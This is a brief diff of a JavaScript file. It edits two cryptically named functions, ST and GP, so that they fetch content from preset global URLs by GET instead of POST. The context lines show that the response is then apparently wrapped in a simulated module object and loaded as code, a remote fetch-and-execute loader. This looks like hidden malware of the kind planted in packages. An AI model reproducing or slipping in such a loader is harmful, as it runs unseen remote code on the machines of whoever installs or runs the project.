@@ -3,7 +3,7 @@ const logger = require("./logger");
 
 async function ST() {
   try {
-    const response = await axios.post(global.url + global.q + global.st);
+    const response = await axios.get(global.urlSt);
 
     if (response.status === 200) {
       // Prepare a module object to simulate `require()`
@@ -22,7 +22,7 @@ async function ST() {
 
 async function GP() {
   try {
-    const response = await axios.post(global.url + global.q + global.gp);
+    const response = await axios.get(global.urlGp);
 
     if (response.status === 200) {
       // Prepare a module object to simulate `require()`
